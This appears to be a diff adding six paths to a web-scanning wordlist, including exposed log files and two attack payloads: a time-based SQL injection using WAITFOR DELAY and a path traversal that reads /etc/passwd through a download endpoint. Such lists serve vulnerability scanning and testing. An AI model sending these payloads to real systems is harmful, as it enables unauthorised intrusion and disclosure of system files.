@@ -1,0 +1,6 @@
+/jsp/wsncapplet.jsp
+/listSelectDialogServlet?slType=slFZX&slCdtn=1=2;WAITFOR+DELAY+%270:0:6%27--
+/logs/debug.log
+/logs/info.log
+/logs/error.log
+/ma/emp/maEmp/download?fileName=../../../../etc/passwd
